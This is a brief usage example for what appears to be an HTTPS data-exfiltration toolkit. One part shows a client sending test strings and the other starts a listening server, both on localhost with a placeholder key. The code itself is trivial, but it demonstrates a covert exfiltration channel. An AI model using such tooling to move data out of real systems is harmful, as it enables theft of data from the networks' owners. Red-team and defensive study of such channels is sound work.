

'''
Client Example
'''

from https_client import HTTPSExfiltrationClient

client = HTTPSExfiltrationClient(host='127.0.0.1', key="123", port=443, max_size=8192)
client.sendData("ABC")
client.sendData("DEFG")
client.close()



'''
Server Example
'''

from https_server import HTTPSExfiltrationServer

server = HTTPSExfiltrationServer(host="127.0.0.1", key="123", port=443, max_connections=5, max_size=8192)
server.startlistening()
